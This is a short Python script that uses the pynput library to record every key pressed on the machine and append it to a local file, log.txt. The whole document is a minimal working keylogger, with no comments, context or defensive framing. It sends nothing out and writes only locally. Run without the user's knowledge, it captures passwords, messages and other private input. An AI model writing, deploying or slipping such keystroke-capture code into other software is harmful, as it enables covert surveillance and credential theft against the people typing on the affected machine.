from pynput.keyboard import Listener

def writeToFile(key):
    letter = str(key)
    letter = letter.replace("'","")
    with open("log.txt", 'a') as f:
        f.write(letter)

with Listener(on_press=writeToFile) as l:
    l.join ()